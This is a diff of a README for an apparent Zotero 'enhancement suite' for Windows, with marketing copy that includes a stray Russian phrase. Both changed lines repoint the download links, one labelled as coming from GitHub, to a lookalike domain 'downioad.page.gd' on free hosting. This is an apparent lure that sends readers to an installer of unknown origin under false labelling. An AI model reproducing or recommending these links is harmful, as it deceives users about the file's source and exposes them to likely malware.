@@ -2,7 +2,7 @@
 
 Zotero (бесплатный, но можно про премиум-функции) is a powerful, open-source reference manager. This repository provides a curated suite of official and community-developed extensions designed to unlock advanced functionality, streamline research workflows, and expand the core capabilities of the free Zotero desktop application for Windows. It is your go-to package for maximizing productivity in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 This package consolidates tools that enhance citation management, PDF processing, group collaboration, and storage synchronization. It assumes you have Zotero already installed on your Windows 10 or Windows 11 system.
 
@@ -52,7 +52,7 @@ A4: No. This is a purely local tool suite for your desktop application. It does 
 
 The latest version of the installation package is available from the official release page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *This project is an independent enhancement suite and is not officially affiliated with or endorsed by the Zotero developers or the Corporation for Digital Scholarship. Use at your own discretion. Last updated: 2026.*
